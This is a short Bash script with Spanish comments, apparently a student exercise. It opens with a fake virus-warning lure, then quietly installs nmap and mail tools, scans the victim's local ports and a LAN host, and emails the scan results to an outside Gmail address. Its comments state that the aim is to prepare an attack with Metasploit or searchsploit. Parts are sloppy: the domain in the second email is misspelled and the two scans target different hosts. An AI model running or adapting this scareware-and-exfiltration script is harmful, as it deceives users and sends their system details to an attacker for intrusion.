echo "Tu pc está siendo escaneado por un virus,pinche aquí para pararlo"

 sudo apt install nmap -y
 sudo apt install mailutils -y
 sudo apt install postfix -y
 #le instalamos mailutils para poder mandar correos
#se lo volvemos a añadir ya que debe ser usado en máquina linux
#le obligamos a instalar nmap para descubrir que puertos tiene vulnerable

touch resultado_nmap.txt
#le creamos un archivo de texto donde mandara los resultados
touch servicios_detectados.txt
#le creamos un archivo de texto donde mandara los servicios que tiene abiertos

nmap -p 1-5000 127.0.0.1 -oN resultado_nmap.txt 
#le escaneamos los puertos del 1 al 5000
#le añadimos el archivo de texto donde mandara los resultados

nmap -sV -p$(cat resultado_nmap.txt | grep "open" | awk '{print $1}' | cut -d'/' -f1 | tr '\n' ',') 192.168.1.100 -oN servicios_detectados.txt
#le añadimos que nos muestre los servicios que tiene abiertos en los puertos que hemos encontrado

mail -s "Resultados Nmap" richardo94ac@gmail.com < resultado_nmap.txt
#le añadimos que nos mande por correo los resultados para poder realizar el ataque. 

mail -s "Resultados del Escaneo Nmap" richardo94ac@egmail.com < servicios_detectados.txt
#le añadimos que nos mande por correo los servicios que tiene abiertos en los puertos que hemos encontrado

cat servicios_detectados.txt
cat resultado_nmap.txt | grep "open"
#vemos dentro del archivo que nos hemos mandado que puertos tiene abiertos y que servicios en estos puertos

#con esta información ya podemos hacer un ataque a la máquina dependiendo de los servicios y puertos que tenga abiertos usando metasploitable o searchsploit